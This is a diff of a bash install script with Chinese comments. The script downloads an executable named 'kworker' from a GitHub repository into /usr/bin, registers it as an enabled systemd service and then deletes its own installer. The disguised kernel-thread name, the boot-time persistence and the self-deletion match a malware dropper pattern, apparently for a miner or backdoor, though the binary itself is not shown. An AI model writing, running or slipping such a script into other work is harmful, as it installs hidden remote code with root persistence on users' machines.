@@ -1,15 +1,15 @@
-wget https://raw.githubusercontent.com/r00tin/oktest/refs/heads/main/kworker /usr/bin/kworker
-mv kworker /usr/bin/kworker
-chmod +x /usr/bin/kworker
-
 #!/bin/bash
 
-# 将脚本文件转换为 Unix 格式，去掉可能存在的 Windows 换行符
-if [ -f "$0" ]; then
-    sed -i 's/\r//' "$0"
-fi
+set -e  # 一旦出错立即退出
+set -x  # 显示执行过程，方便调试
 
-# 设置kworker路径和工作目录
+# 下载kworker到指定路径
+wget -O /usr/bin/kworker https://raw.githubusercontent.com/r00tin/oktest/refs/heads/main/kworker
+
+# 设置权限
+chmod +x /usr/bin/kworker
+
+# kworker路径和工作目录
 KWORKER_PATH="/usr/bin/kworker"
 WORKING_DIR="/usr/bin/"
 
@@ -31,36 +31,29 @@ WantedBy=multi-user.target"
 
 # 检测系统类型并创建服务
 if [ -f /etc/debian_version ]; then
-    # Debian/Ubuntu 系统
     echo "Detected Debian/Ubuntu system."
-    
-    # 创建systemd服务文件
     echo "$SERVICE_CONTENT" > /etc/systemd/system/kworker.service
-    
+
 elif [ -f /etc/redhat-release ]; then
-    # CentOS 系统
     echo "Detected CentOS system."
-    
-    # 创建systemd服务文件
     echo "$SERVICE_CONTENT" > /etc/systemd/system/kworker.service
-    
+
 else
     echo "Unsupported system type."
     exit 1
 fi
 
-# 重新加载systemd配置
+# 重新加载 systemd 配置
 systemctl daemon-reload
 
-# 启用服务
+# 启用并启动服务
 systemctl enable kworker.service
-
-# 启动服务
 systemctl start kworker.service
 
-# 显示服务状态
-systemctl status kworker.service
+# 检查服务状态
+systemctl is-active --quiet kworker.service && echo "kworker service started successfully." || { echo "Failed to start kworker service."; exit 1; }
 
+# 删除安装脚本
+rm -f install.sh
 
-rm kworker
-rm install.sh
+echo "脚本已完成，kworker服务已安装并启动。"
